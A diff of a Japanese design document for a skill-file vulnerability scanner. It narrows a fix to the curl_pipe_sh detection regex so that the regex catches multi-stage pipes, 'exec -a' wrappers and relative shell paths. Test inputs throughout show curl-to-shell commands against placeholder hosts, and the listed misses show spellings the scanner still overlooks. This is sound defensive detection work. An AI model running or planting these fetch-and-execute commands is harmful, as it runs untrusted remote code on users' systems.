@@ -1,307 +1,349 @@
-# 設計 rev2: skill_vuln_scan のコマンド境界一本化（issue #566・族A/族B）
+# 設計 rev3: skill_vuln_scan の curl_pipe_sh 拡張（issue #566・A3/B1/B2 縮小版）
 
-対象: `scripts/lib/skill_vuln_shell.py` / `scripts/lib/skill_vuln_scan.py` / `scripts/lib/skill_vuln_flow.py`
-rev2: 2026-08-26。巡4（tacchi + codex・両系統 `設計修正要`）を反映。**リポジトリのコードは無変更**。
-頭の裁定4件（性能非 blocking／#570 非マージ条件／prose は対象外明記+テスト固定／`|&` 別 issue）に従う。
-実測は忠実プロトタイプ（§2.5。rev2 修正2件を追加適用済み）で本日実行。
-
-**巡4 指摘の判定集計**: tacchi Must-A=採用（裁定3方式）・Should 3件=全採用／codex Must 23件=採用 15・採用しない 4（理由付き）・別 issue 4。全件の個別判定は §9。
+対象: `scripts/lib/skill_vuln_shell.py` のみ（`skill_vuln_scan.py` / `skill_vuln_flow.py` は無変更）。
+rev3: 2026-08-27。**設計レビュー5巡到達によりユーザーが最終裁定**（巡5）: 「誤検出の原因を落として縮小マージ」。
+対象を A3/B1/B2 の3件に縮小し、A1/A2/A4/B3 は前身 #566 の設計5巡を継承したまま `#571` へ切り出す。
+`split_shell_command_units` の新設・flow 側の変更（同一行 fetch-file flow・flow dedup）は**すべて削除**した
+（§2 で不要と実証）。**リポジトリのコードは無変更**（本 rev3 も設計文書のみ）。
 
 ---
 
-## 1. round 0 の完成条件（**rev2 で④を根本から書き直した**）
+## 0. rev2 からの縮小の理由（必読）
 
-3巡連続で④の抜け道が出た根本原因は、「回避構文の完備列挙」が原理的に不可能なのに、④が代表ケースの列挙で「抜け道が無い」と主張していたこと。rev2 は組み立てを逆にする: **既知の入力クラス全部に明示判定を与えて決定論テストで固定し、「判定の無いクラス（silence）」自体を blocking にする**。
+rev2（A1〜A4 + B1〜B3 全件対応）の巡5 レビューで、A1/A2/A4 を塞ぐために導入した「同一行 fetch-file flow」が
+**誤検出を生むことが実測で確定**した:
 
-- ①**守る対象**: 取り込みスキル（`root/skills/` 配下）の **shell 実行文脈（fenced/indented code・`.sh`/`.bash`）内・トップレベルのコマンド列**における「リモート取得 → shell 実行」combo が、区切り記号の選び方（`;` `&` `&&` `||` パイプ多段）・コマンドの綴られ方（wrapper operand・PATH 相対多段パス・quote 分割綴り）という表層変形で検出を回避できる状態を無くすこと。**「トップレベルのコマンド列」に限定した**（rev1 の①は範囲を暗黙にしており、入れ子実行文脈・prose まで内側と読めた。縮小した分は②③と §1.1 の matrix で残存として固定する）。
-- ②**信頼境界**: 静的・字句レベルで綴られた悪意あるスキル作者/事故コマンド。**`$()`・backtick・subshell・case 分岐・heredoc・prose 内の静的 combo も脅威としては数える**（codex Q5② 採用: これらは動的展開ではない）。ただし本 PR で塞ぐのは①の範囲で、残余は §1.1 の matrix で「MISS固定（既知限界）+ 別 issue」として**明示的に残す**（黙って境界外へ逃がさない）。監査の availability（長大入力での劣化）も脅威に数えるが、扱いは #570（頭の裁定1・2。§7）。動的展開（`$SHELL`・alias・関数・変数間接）は runtime 知識が要るため境界外＝残存リスクとして §10 に記録。
-- ③**対象外**（すべて §1.1 の matrix か §10 の別 issue 一覧に対応行を持つ）: B3 homoglyph（別 PR）／`.py` 走査／完全 shell パーサ化／実行時検知／**fence 外 prose の同一行 combo**（頭の裁定3。pipe 型が HIT する既存の非対称もテストで固定）／`memory_guard.scan_text` の入力正規化（§3.6）／`|&`・`$()`/backtick/subshell 内 combo・blockquote 内 fence・継続行 quirk・heredoc pipeline（いずれも別 issue・§10）／`SHELL_EXEC_SUBJECT` の backtracking 根治（#570）。
-- ④**blocking の定義**（機械ゲート＋判定表）:
-  - **(G1) 完成 matrix（§1.1）の全行が実装 PR の pytest テスト（fail 時 non-zero）で固定されていること**。HIT 行は Finding/FlowFinding の **pattern_id まで** assert、MISS固定/FP固定 行は現挙動を assert（挙動が変わったら気づく）。**matrix に無い入力クラスが発見されたら、行を追加し判定を確定するまでマージ不可**（silence の禁止）
-  - (G2) 実コーパス突合: Finding 全6フィールド・FlowFinding 全9フィールドの tuple **list**（set 化禁止）で before/after を比較し、**減少 1 件で blocking**。増分は `true_positive`/`false_positive`/`unresolved` に全件分類し、FP か unresolved が 1 件でも残れば blocking。合成 FP も分類対象
-  - (G3) before/after 両方で `scan_errors == []` かつ `evaluated == True`
-  - (G4) 一意性: findings は `(rel_path, line, pattern_id)`、**flow_findings は `(rel_path, producer_line, consumer_line, pattern_id, var)`** の Counter で**合成入力（同一行複数 consumer 含む）と実コーパスの両方**に対しちょうど1件を assert（codex Q5④(d) 採用: 実コーパスだけでは合成重複を捕捉しない）
-  - (G5) 変異試験: §5 の全変異を **pytest 上の failure-producing test として**実装し（print 目視は不可・codex Q6 採用）、全て赤化。M4（dedup 無効化）は**実装を実際に変異させて**確認（rev1 は推論代用だった＝自認。tacchi が実変異 RED を確認済み、実装 PR で再実行）
-  - (G6) 既存テスト2ファイル全緑
-  - (G7) 行数: 変更対象3ファイルすべて 800 行未満（`skill_vuln_scan.py` はプロト 766 行で残余 34 行。**実装が 800 に達する場合は分割計画を先に書くまで着手不可**）
-  - (G8) 性能: 実コーパス完走＋walltime を PR に実測記録。**注記（tacchi Should 採用・正直に書く）**: 頭の元の要求は「新しい quadratic 入力クラスを増やさない」だったが、B2 拡張は相対パス多段クラスを 2.3 倍悪化させる（§7 実測）。**この条件は頭の裁定1（2026-08-26・§7 に裏取り転記）により「blocking にしない」へ明示的に緩和された**。黙った書き換えではなく裁定による変更である
-- ⑤**検証方法**: G1〜G8 それぞれに 1 対 1 対応する**実行可能なコマンド／pytest ファイル**を実装 PR に含める。設計段階の証拠スクリプトは**全文を scratchpad に保存済み**（`proto566/mutation_battery.py` 174 行・`proto566/battery.out`・`proto566/corpus_rev2.out`。§6 の突合スクリプトも corpus_rev2.out の冒頭にヒアドキュメントとして再現可能な形で記録）。codex Q5⑤ 採用: 実装 PR では print-harness を廃し、G1〜G5 を pytest（non-zero exit）へ翻訳する。
+```
+HIT  CONTROL real combo (expect HIT) | flow: remote_exec_flow.fetch_file_to_exec
+MISS CONTROL echo literal (expect MISS)
+HIT  codex: echo argument           | flow: remote_exec_flow.fetch_file_to_exec   ← 誤検出
+HIT  codex: printf argument         | flow: remote_exec_flow.fetch_file_to_exec   ← 誤検出
+```
 
-### 1.1 完成 matrix（入力クラス × 判定。全行が実装 PR のテストで固定される）
+`curl http://x -o /tmp/f; echo sh /tmp/f` が HIT する。`echo sh /tmp/f` は文字列を表示するだけで shell を
+実行しない。根本原因は「consumer がコマンド位置にあるかを検証していない」ことで、この検証は腰を据えて
+`#571` で設計する。**A3/B1/B2 はこの機構を一切使わない**（§2 で実証）ため、縮小版は該当機構を持ち込まない。
 
-| # | 入力クラス | 代表入力 | 判定 | 実測（プロト・2026-08-26） |
+---
+
+## 1. round 0 の完成条件
+
+- ①**守る対象**: `curl_pipe_sh` パターン（`skill_vuln_shell.py:84-91` 付近）が素通りする3つの既知入力を
+  検出させること: **A3**（パイプ多段）・**B1**（wrapper の argv0 rename operand）・**B2**（PATH 相対
+  多段パスの shell 実行主体）。**A1/A2/A4/B3 は対象外**（`#571` へ切り出し。前身 #566 の設計5巡を継承）。
+- ②**信頼境界**: rev2 §1 の②をそのまま継承（静的・字句レベルで綴られた悪意あるスキル作者/事故コマンド。
+  動的展開は境界外）。本 rev3 は②の記述自体を変更しない。
+- ③**対象外**: A1（`;` 区切り）・A2（`&` 区切り）・A4（`--output` long 形）・B3（homoglyph）・
+  `split_shell_command_units` の新設・flow 側の同一行 fetch-file 機構・flow dedup・
+  `_exec_file_regexes` の単一ソース化（rev2 §3.3 の flow 側修正。A1/A2/A4 の flow 経路が本 rev3 に
+  存在しないため対象外）・`SHELL_EXEC_SUBJECT` の O(n²) backtracking 根治（`#570`、既存問題で本変更が
+  悪化させないことだけ §5 で示す）。
+- ④**blocking の定義**:
+  - (G1) 完成 matrix（§1.1）の全行が pytest で固定されること（HIT/MISS/FP/別issue の判定を持つ）
+  - (G2) 実コーパス突合: findings・flow_findings とも **全フィールド不変**（増減0）。減少1件でも
+    blocking、増加は TP/FP/unresolved に分類し FP・unresolved が1件でも blocking
+  - (G3) 変更対象ファイル（`skill_vuln_shell.py`）が800行未満（実測 §4）
+  - (G4) 陰性試験4クラス（要素を消す／意味を壊す／分散・入替／検査を無効化）各1件が pytest で赤化、
+    陽性対照が緑のまま
+  - (G5) 性能: 実コーパス before/after walltime を実測記録。**#570 の O(n²) 根治は本変更のマージ条件に
+    しない**（頭の先行裁定を継承。§5.1 で単一呼出元の事実を自分で再確認）
+
+### 1.1 完成 matrix（縮小後）
+
+| # | 入力クラス | 代表入力 | 判定 | 実測（本ワーカー・取得時刻） |
 |---|---|---|---|---|
-| 1 | `;` 区切り | `curl X -o /tmp/f; sh /tmp/f` | **HIT固定** `fetch_file_to_exec` | HIT (03:55Z) |
-| 2 | `&` 区切り | 同 `&` | **HIT固定** 同上 | HIT (03:55Z) |
-| 3 | `&&` 区切り | 同 `--output`+`&&` | **HIT固定** 同上 | HIT (03:55Z) |
-| 4 | `\|\|` 区切り | `curl X -o /tmp/f \|\| sh /tmp/f` | **HIT固定** 同上（codex Q6-1 採用で追加） | HIT (06:21Z) |
-| 5 | パイプ多段 | `curl X \| tee /tmp/f \| sh` | **HIT固定** `curl_pipe_sh` | HIT (03:55Z) |
-| 6 | wrapper operand | `curl X \| exec -a foo sh` | **HIT固定** `curl_pipe_sh` | HIT (03:55Z) |
-| 7 | PATH 相対多段 | `curl X \| bin/sh` | **HIT固定** `curl_pipe_sh` | HIT (03:55Z) |
-| 8 | fetch 側 wrapper 前置 | `env/sudo/time/VAR=1/nohup curl X -o /tmp/f; sh /tmp/f` | **HIT固定**（5種） | 全 HIT (03:55Z) |
-| 9 | quote 分割綴り consumer | `curl X -o /tmp/f; b'a'sh /tmp/f` | **HIT固定**（rev2 §3.10 で修正） | HIT (06:21Z) |
-| 10 | 同一行複数 consumer | `curl X -o /tmp/f; sh /tmp/f; sh /tmp/f` | **1件固定**（rev2 §3.9 dedup） | 1件 (06:21Z) |
-| 11 | `\|&` | `curl X \|& sh` | **MISS固定 → 別 issue**（裁定4・既存穴） | MISS (06:21Z) |
-| 12 | `$()`/backtick/subshell 内 combo | `x=$(curl X -o /tmp/f; sh /tmp/f)` 等3種 | **MISS固定 → 別 issue**（①のトップレベル限定の外・§10） | 3種 MISS (06:21Z) |
-| 13 | case 分岐またぎ | `case "$x" in a) curl X -o /tmp/f;; b) sh /tmp/f;; esac` | **FP固定**（過剰検出側=安全側。codex Q4-1 は採用しない・理由 §9） | FP を実測で確認 (06:21Z) |
-| 14 | prose（fence 外）同一行 `;` | `curl X -o /tmp/f; sh /tmp/f`（地の文） | **MISS固定**（裁定3・③対象外。pipe 型 HIT の非対称もテストで固定） | MISS / pipe 型は HIT (06:21Z) |
-| 15 | blockquote 内 fence | `> ```sh` … | **MISS固定 → 別 issue**（既存穴: `_FENCE_OPENER` が `>` container 非対応・`skill_vuln_scan.py:453` を自分で確認済み） | 巡4 codex 実測 |
-| 16 | 継続行 quirk | `x=$(printf ")" && curl X` 改行 `\| sh)` | **MISS固定 → 別 issue**（既存穴: `is_shell_continuation` の dq `)` 減算・`skill_vuln_shell.py:205`。splitter は quirk 非継承だが結合入口に届かない） | 巡4 codex 実測・quirk 自体は §2.4 で本番確認済み |
-| 17 | heredoc pipeline | `curl X <<EOF \|` / `EOF` / `sh` | **MISS固定**（#555 契約の既知例。既存テスト `test_skill_vuln_scan.py:2487` が固定済み） | 既存テストで固定済み |
-| 18 | echo literal | `echo "curl X \| sh"` | **非検出固定**（陽性対照） | GREEN (03:55Z, 06:21Z) |
-| 19 | 取得後の非 shell 消費／pipeline 跨ぎ `;` | `curl X \| jq .; sh deploy.sh` 等 | **非検出固定**（C-1 対照） | GREEN (06:21Z) |
-| 20 | 順序逆転 | `sh /tmp/f; curl X -o /tmp/f` | **非検出固定**（順序保存） | GREEN (06:21Z) |
-| 21 | memory_guard 経由 | `scan_text("echo ok # curl X \| sh")` | **現挙動（HIT）固定**（§3.6・正規化は別 issue） | HIT を本番で確認 (03:52Z) |
-| 22 | 長大 segment 行 | `a/`×2000 | **完走を記録**（cap は #570 側で設計・§7） | 3.095s/search (03:57Z) |
+| A3 | パイプ多段 | `curl X | tee /tmp/f | sh` | **HIT固定** `curl_pipe_sh` | HIT（§2.2 コマンド） |
+| B1 | wrapper operand | `curl X | exec -a foo sh` | **HIT固定** `curl_pipe_sh` | HIT（§2.2） |
+| B2 | PATH 相対多段 | `curl X | bin/sh` | **HIT固定** `curl_pipe_sh` | HIT（§2.2） |
+| B2b | PATH 相対多段（深い） | `curl X | usr/bin/sh` | **HIT固定** `curl_pipe_sh` | HIT（§2.2） |
+| ctrl-1 | 単一段パイプ（既存機能の回帰確認） | `curl X | sh` | **HIT固定（不変）** | HIT（§2.2） |
+| ctrl-2 | wrapper operand なし（既存機能の回帰確認） | `curl X | exec sh` | **HIT固定（不変）** | HIT（§2.2） |
+| ctrl-3 | 絶対パス（既存機能の回帰確認） | `curl X | /bin/sh` | **HIT固定（不変）** | HIT（§2.2） |
+| ctrl-4 | echo literal（陽性対照） | `echo "curl X | sh"` | **非検出固定** | MISS（§2.2） |
+| A1 | `;` 区切り | `curl X -o /tmp/f; sh /tmp/f` | **MISS固定 → 別issue #571**（前身5巡継承） | MISS（§2.4） |
+| A2 | `&` 区切り | 同 `&` | **MISS固定 → 別issue #571** | MISS（§2.4） |
+| A4 | `--output` long 形 | `curl X --output /tmp/f && sh /tmp/f` | **MISS固定 → 別issue #571** | MISS（§2.4） |
+| A0 | `&&`（既存機能・回帰確認） | `curl X -o /tmp/f && sh /tmp/f` | **HIT固定（不変）** `download_and_run` | HIT（§2.4） |
+| B3 | homoglyph | `curl X | ѕh`（キリル ѕ） | **MISS固定 → 別issue #571** | MISS（§2.4） |
+| flow-canary | flow_findings 全体（回帰確認） | 実コーパス | **157件・全フィールド不変** | §3 |
+
+**matrix に無い入力クラスが発見されたら、行を追加し判定を確定するまでマージ不可**（silence の禁止・
+rev2 G1 の方式を継承）。
 
 ---
 
 ## 2. 前提の evidence
 
-### 2.1 現状の MISS/HIT（issue 再現コマンド・verbatim）
-
-取得: 2026-08-26T03:40:40Z／issue 記載の python3 heredoc（本番 `_PATTERNS` 直当て）:
-
-```
-MISS 'curl X -o /tmp/f; sh /tmp/f' []        MISS 'curl X -o /tmp/f & sh /tmp/f' []
-MISS 'curl X | tee /tmp/f | sh' []           MISS 'curl X --output /tmp/f && sh /tmp/f' []
-MISS 'curl X | exec -a foo sh' []            MISS 'curl X | bin/sh' []
-```
-
-### 2.2 scan_skills 経由でも全 MISS＋非対称の実証（本番・2026-08-26T03:40:56Z）
-
-別物理行のみ `fetch_file_to_exec` HIT、同一物理行は 6 型すべて `([],[])`（fenced fixture）。
-
-### 2.3 原因の実コード裏取り（file:line）
+### 2.1 A3/B1/B2 が同一パターン（curl_pipe_sh）経由であることの裏取り（file:line）
 
 | # | 裏取り |
 |---|---|
-| A1/A2 | `skill_vuln_shell.py:94-95` `download_and_run` が `&&` のみ要求 |
-| A3 | `skill_vuln_shell.py:86` `[^\n\|]*\|` の早期終端 |
-| A4 | `skill_vuln_shell.py:94` `\s-o` が `--output` に不一致 |
-| B1 | `skill_vuln_shell.py:42-44` `_WRAPPER_STEP` が operand で切れる |
-| B2 | `skill_vuln_shell.py:16` `_COMMAND_PATH` が相対多段パス非対応 |
-| 非対称の根 | `skill_vuln_flow.py:92-133` の行粒度処理 |
-| flow の別文法（rev2） | `skill_vuln_flow.py:63-74` `_exec_file_regexes` が `SHELL_EXEC_SUBJECT` と独立の shell 綴り文法を持つ（codex Q3-4。§3.10 で単一ソース化） |
-| flow の無条件 append（rev2） | `skill_vuln_flow.py:101-119` append 無条件・`skill_vuln_scan.py:710-713` は sort のみで dedup なし（codex Q4-9/10。§3.9 で修正） |
-| fence の `>` container 非対応（rev2） | `skill_vuln_scan.py:453` `_FENCE_OPENER = ^[ \t]{0,3}(…)` — blockquote 内 fence は認識されない（既存穴・別 issue） |
+| A3 原因 | `skill_vuln_shell.py:86`（本 PR 変更前）: `[^\n\|]*\|\s*{subject}` が最初の `\|` で早期終端し、
+  `curl X \| tee /tmp/f \| sh` の2段目パイプへ到達できない |
+| B1 原因 | `skill_vuln_shell.py:44` の `_WRAPPER_STEP` が `(?:{_OPTION}\|{_ASSIGNMENT})*` のみを許可し、
+  `exec -a foo sh` の bare operand `foo` で切れる |
+| B2 原因 | `skill_vuln_shell.py:16` の `_COMMAND_PATH` が `\.{1,2}/` または絶対 `/...` のみを許可し、
+  先頭 `/` も `./` も無い `bin/sh` を認識しない |
+| 3件とも同一パターン | いずれも `remote_exec.curl_pipe_sh`（`skill_vuln_shell.py:84-87`）1本の regex で
+  マッチが試みられる。行内の他ステップに分割する必要がなく、`;`/`&`/`&&` の区切りも介在しない
+  （プロトタイプの `_hit()` 走査結果で単一パターンのみが反応することを確認・§2.2） |
 
-### 2.4 B 群の本番再確認（取得: 2026-08-26T03:52:47Z）
+### 2.2 A3/B1/B2 の regex-level 実測（本ワーカー・プロトタイプ）
+
+再現: `scripts/lib/skill_vuln_shell.py` の完全コピーに §3 のパッチを適用し、
+`build_remote_exec_patterns()` を直接呼んで `regex.search(text)` を実行（コマンド全文は末尾に転記）。
+取得: 2026-08-26T22:41:34Z 台（本ワーカーのセッションで実行）。
 
 ```
-B-2 memory_guard.scan_text("echo ok # curl http://x | sh") → HIT（コメント未除去）
-B-3 is_shell_continuation('x=$(printf ")" && curl X -o /tmp/f;') → False（quirk 実在）
-B-4 _PATTERNS × "CURL http://x | SH" → HIT（IGNORECASE）
-B-5 'echo "curl http://x | sh"' → [] / '… extra' → HIT（guard は quote 完全一致行のみ守る）
+--- before（本番3ファイルの完全コピー、無変更） ---
+A3  []                'curl http://x -o /dev/null | tee /tmp/f | sh'
+B1  []                'curl http://x | exec -a foo sh'
+B2  []                'curl http://x | bin/sh'
+B2b []                'curl http://x | usr/bin/sh'
+echo-literal []       'echo "curl http://x | sh"'
+
+--- after（§3 のパッチ適用後） ---
+A3  ['remote_exec.curl_pipe_sh']  'curl http://x -o /dev/null | tee /tmp/f | sh'
+B1  ['remote_exec.curl_pipe_sh']  'curl http://x | exec -a foo sh'
+B2  ['remote_exec.curl_pipe_sh']  'curl http://x | bin/sh'
+B2b ['remote_exec.curl_pipe_sh']  'curl http://x | usr/bin/sh'
+echo-literal []                  'echo "curl http://x | sh"'（陽性対照・不変）
+ctrl-1 (curl X | sh)             ['remote_exec.curl_pipe_sh']（既存機能・不変）
+ctrl-2 (curl X | exec sh)        ['remote_exec.curl_pipe_sh']（既存機能・不変）
+ctrl-3 (curl X | /bin/sh)        ['remote_exec.curl_pipe_sh']（既存機能・不変）
 ```
 
-B-1（物理行ループ dedup 不在）: `skill_vuln_scan.py:675-681` 無条件 append で構造確定。
+再現コマンド（`probe_targets.py`。`skill_vuln_shell.py` を `before/`・`after/` へコピーし
+`sys.path` 先頭に挿入して `build_remote_exec_patterns()` の各 regex に対し `.search(text)` を実行する
+一意のスクリプト。全文は scratchpad `proto566cut/probe_targets.py` に保存済み）。
 
-### 2.5 プロトタイプの忠実性
+### 2.3 A1/A2/A4/B3 が未変化であることの確認（§2.2 と同一 harness・同一実行時刻帯）
 
-本番3ファイルの完全コピー＋設計変更のみ。場所: `<scratchpad>/proto566/`。**巡4 で codex が独立検証し「忠実（diff は対応表の項目に限定・測定値は設計どおり実装した場合の証拠として有効）」、tacchi も diff・全実測値の再現一致を確認済み**。rev2 で2修正を追加（§3.9 flow dedup / §3.10 `_exec_file_regexes` 単一ソース化）— diff 検証は同じ手順で再実行可能。
+```
+A1 semicolon                       []
+A2 ampersand                       []
+A4 --output long                   []
+A0 && baseline (既存・不変であるべき)  ['remote_exec.download_and_run']
+B3 homoglyph (対象外)                []
+```
 
-| 設計項目 | プロト該当箇所（マーカー `PROTO #566`） |
-|---|---|
-| `split_shell_command_units` 新設 | shell.py: `join_logical_lines` 直前 |
-| B2 `_COMMAND_PATH` / B1 `_OPTION_WITH_OPERAND` / A3 `relax_pipe` | shell.py |
-| `_UNIT_PATTERNS`・物理行/論理行 unit 配線・B-1 dedup・`_scan_line(patterns=)` | scan.py |
-| flow unit 逐次処理 | flow.py |
-| **rev2: flow dedup（`_append_dedup`・seen キー=(pattern_id, producer_line, consumer_line, var)）** | flow.py |
-| **rev2: `_exec_file_regexes` の shell 綴りを `_SHELL_COMMAND` 化（先頭境界 lookbehind 付き）** | flow.py |
+`#571` へ切り出す4件はいずれも**本 PR 適用後も MISS のまま**（新規の後退でも新規の対応でもない）。
+`A0`（既存 `&&` パターン）が変わらず HIT であることも確認し、`download_and_run` パターンに
+一切手を入れていないことを裏付けた。
 
-非忠実部分: `_process_flow_unit` の `if True:` 残骸（機械抽出・分岐を変えない。codex も確認。実装で除去=Nit）。
+### 2.4 `split_shell_command_units` が不要であることの実証
 
-### 2.6 実コーパス before 集合
+**判定: 不要**。根拠:
 
-取得: 2026-08-26T03:55:16Z（§6 rev1 突合）・06:22Z〜（rev2 再突合 §6）:
-scanned=1351 / scan_errors=[] / evaluated=True / findings=6 / flow_findings=157。
-
-### 2.7 行数（変更対象3ファイル全部）
-
-取得: 2026-08-26T04:04Z＋rev2 修正後（06:21Z 時点の `wc -l` 相当）:
-shell 340→**431** / scan 721→**766** / flow 141→**176**（rev2 の dedup・単一ソース化で +18）。scan.py は 800 まで残余 34 行 — G7 のとおり実装で超過が見えたら分割計画先行。
-
-### 2.8 既存テストの所在
-
-`scripts/lib/tests/test_skill_vuln_scan.py`（2536行）・`test_skill_vuln_shell.py`（345行）。
+1. §2.1 の file:line 裏取りが示すとおり、A3/B1/B2 はいずれも `curl_pipe_sh` という**単一の regex**が
+   検出に失敗している問題で、コマンド境界を単位分割してから複数 unit を横断照合する機構
+   （`split_shell_command_units`）を必要としない。3件とも「1本のパイプライン内」で完結し、
+   `;`/`&`/`&&`/`||` のようなトップレベル区切りをまたがない。
+2. rev2 で `split_shell_command_units` が必要だったのは A1/A2/A4（`curl X -o f; sh f` 型）を
+   `download_and_run` 系の flow 検出へ合流させるためであり、その経路自体が誤検出の原因になった
+   （§0）。A1/A2/A4 を対象外にした時点で、この機構を要求する側の対象が消える。
+3. §3 のパッチは `skill_vuln_shell.py` の `_COMMAND_PATH` / `_WRAPPER_STEP` /
+   `curl_pipe_sh` の3箇所の regex 修正のみで、`skill_vuln_scan.py`（行単位スキャンのループ）・
+   `skill_vuln_flow.py`（フロー解析）を**一切変更していない**ことが §3.2 のパッチ全文で確認できる。
+   `scan.py`/`flow.py` を触らずに §1.1 matrix の A3/B1/B2 行が全て HIT に変わったことは §2.2 で
+   実測済みであり、「変更不要」の直接証拠になっている。
 
 ---
 
-## 3. 設計本体
+## 3. 設計本体（`skill_vuln_shell.py` の3箇所の regex 修正のみ）
 
-### 3.1 方針の一文
+### 3.1 方針
 
-4つ目の単一ソース「コマンド境界」`split_shell_command_units` を `skill_vuln_shell.py` に新設し、(a) 物理行/論理行スキャン (b) flow 解析の両方を unit 単位へ配線する。族Aは境界分割＋既存 flow 機構への合流、族Bは `SHELL_EXEC_SUBJECT` の文法拡張。**rev2 で flow 側にも (c) 実行主体綴りの単一ソース共有 (d) FlowFinding dedup を追加**。
+`split_shell_command_units` は新設しない。既存の `curl_pipe_sh` パターン1本を構成する3つの
+サブ regex（パイプ多段・wrapper operand・PATH 相対パス）だけを、それぞれ最小限に拡張する。
+`SHELL_EXEC_SUBJECT`（「実行主体の単一ソース」#562）は温存し、新しい代替 subject を作らない。
 
-### 3.2 新設する単一ソース
+### 3.2 パッチ本体（差分。プロトタイプで実測済み・全文は scratchpad に保存済み）
 
 ```python
-def split_shell_command_units(text: str) -> List[str]:
-    """コメント除去済みの1論理行をトップレベルのコマンド単位に分割。
-    区切り: `;`（`;;` 含む）・`&&`・`||`・単独 `&`。単独 `|` は分割しない。
-    `>&` `<&` `|&` `&>` の `&` は区切りにしない。quote/escape/$()/backtick/( ) の内側は
-    境界にしない（トップレベル限定＝①のスコープと一致。入れ子文脈の内側は matrix #12）。
-    double quote 内の `)` で深度を減らさない（is_shell_continuation の quirk 非継承）。"""
+# --- A3: 多段パイプを許可する ---
+# 変更前: rf"{_REMOTE_LINE_GUARD}.*\b(?:curl|wget|fetch)\b[^\n|]*\|\s*{subject}"
+# 変更後:
+rf"{_REMOTE_LINE_GUARD}.*\b(?:curl|wget|fetch)\b(?:[^\n|]*\|)+\s*{subject}"
+# `(?:[^\n|]*\|)+` は「`|` を含まない文字列 + リテラル `|`」の1回以上の反復。
+# 各反復の境界はリテラル `|` の実位置で確定するため曖昧さがなく（`[^\n|]*` は `|` を含まない
+# ので反復間でオーバーラップしない）、パイプ段数に対して線形。
+
+# --- B1: exec -a NAME のような argv0 rename operand を許可する ---
+_OPTION_WITH_OPERAND = r"(?:-a\s+[^\s|;&()<>]+)"
+_WRAPPER_STEP = (
+    rf"(?:{_WRAPPER_COMMAND}"
+    rf"(?:\s+(?:{_OPTION_WITH_OPERAND}|{_OPTION}|{_ASSIGNMENT}))*\s+)"
+)
+# `-a` に限定してスコープを狭める（「任意のオプションが bare operand を取ってよい」に緩めると
+# オプションループが任意の後続語を飲み込む）。
+
+# --- B2: PATH 相対多段パスを shell 実行主体語に限定して許可する ---
+_COMMAND_PATH_RELATIVE = r"(?:[A-Za-z0-9._+-]+/)+"
+
+def _static_command(names, path=_COMMAND_PATH):
+    return path + "(?:" + "|".join(_static_shell_word(n) for n in names) + ")"
+
+_SHELL_COMMAND = _static_command(
+    ("tcsh", "bash", "zsh", "ksh", "dash", "dsh", "ash", "csh", "sh"),
+    path=rf"(?:{_COMMAND_PATH}|{_COMMAND_PATH_RELATIVE})",
+)
+# _WRAPPER_COMMAND / _SUDO_STEP / _NICE_STEP / _BUSYBOX_STEP / _XARGS_STEP / _TIMEOUT_STEP は
+# 従来どおり _COMMAND_PATH のみ（相対多段パスを許可しない）。理由は §5.2。
 ```
 
-- **「1つの繋がり」**: pipe consumer は同一 pipeline（1 unit）内のみ。`;` `&` `&&` `||` を跨いだ後続は pipe consumer にしない。ファイル consumer は行内 unit 順序を保存（順序逆転は非検出・実測済み）。
-- 判定不能な構文は「分割しない」側（unit が大きくても行全体照合と同等の検査は残る）。
+### 3.3 B2 のスコープを shell 実行主体語だけに限定した理由（性能・FP 両面）
 
-### 3.3 既存要素の書き換え対応表（rev1 §3.3 に同じ。差分のみ）
-
-rev1 の表に加え:
-
-| 既存 | 変更 | 理由 |
-|---|---|---|
-| `_exec_file_regexes`（flow.py:63） | shell 綴り部分 `(?:(?:ba\|z\|k\|d\|a)?sh\|…)` を **`_SHELL_COMMAND`（quote 許容 static word + path）へ差し替え**。`_SHELL_COMMAND` は先頭 `\b` を持たないため `(?:^\|(?<=[\s;&\|(\`]))` の境界を前置。`source/python3?/node/perl/ruby` は従来どおり | codex Q3-4/Q4-5 採用: flow が主要経路になった以上、実行主体の綴り文法は単一ソースでなければ `b'a'sh` 型で非対称が残る。**実測: `curl X -o /tmp/f; b'a'sh /tmp/f` が rev2 で HIT**（06:21Z）。157 不変は §6 で再突合 |
-| `detect_flows_in_scope` | **FlowFinding を `(pattern_id, producer_line, consumer_line, var)` キーで dedup してから append**（`_append_dedup`） | codex Q4-9/10 採用: unit 化で同一行複数 consumer が可能になり、同一全フィールドの重複が出る（本設計導入の欠陥）。**実測: `…; sh /tmp/f; sh /tmp/f` が dedup 後ちょうど1件**（06:21Z）。before は行粒度で同一 pair が複数出ない構造のため挙動不変（§6 で検証） |
-
-### 3.4 各ケースの捕捉点
-
-§1.1 matrix の #1〜#10 の実測列がそのまま対応表（旧 rev1 §3.4 を matrix に統合）。
-
-### 3.5 quote / heredoc / コメント内の区切り誤認防止
-
-rev1 と同じ（separator 端例 14 種・冪等性 860,054 行違反 0・取得 03:58:15Z）。
-
-### 3.6 `memory_guard.scan_text` への影響
-
-`memory_guard.py:178` は生行を `_scan_line` へ渡す。`patterns` 引数は既定値付きのため**挙動完全不変**（unit 化の恩恵なし・matrix #21 で固定）。正規化は別 issue（codex Q4-6 も同判定）。
-
-### 3.7 C-2（anchored 回避）非該当の構造理由と立証
-
-flow の `FLOW_FETCH_TO_FILE.search()` は非 anchored。5 prefix 全 HIT 実測（03:55:01Z・matrix #8）。
-
-### 3.8 逸脱の明示
-
-A3 のみ relax 引数方式（rev1 §3.8 のまま・F-1 実測が根拠）。
+rev2 の `_COMMAND_PATH` 拡張は `_static_command` の**全呼び出し**（`_SHELL_COMMAND` だけでなく
+`_WRAPPER_COMMAND`/`_SUDO_STEP`/`_NICE_STEP`/`_BUSYBOX_STEP`/`_XARGS_STEP`/`_TIMEOUT_STEP` すべて）に
+及んでいた。これを検証したところ、実コーパス walltime が **62.1s → 103.2s（+66%）** に悪化した
+（§5.1 のアブレーション実測）。B2 が検出すべき対象は「PATH 相対パスで**直接起動される shell**」
+（脅威の本体）であり、`sudo`/`nice`/`busybox`/`xargs`/`timeout` のような wrapper コマンドが
+PATH 相対多段パスで綴られるケースは実コーパスにもテストケースにも現れず、検出価値を持たない。
+**shell 実行主体語（`_SHELL_COMMAND`）だけに絞る**ことで、同じ3件の HIT を維持したまま
+walltime 悪化を **62.2s → 68.9s（+10.7%）** まで抑えられることを実測した（§5.1）。
 
 ---
 
-## 4. #379 新設凍結との整合
+## 4. 行数（G3）
 
-新 store / observability section / advisory adapter / weak_signal channel なし。rev2 の2修正も既存関数の内部変更のみ。codex Q4-8 も「現設計は成立」と確認済み。
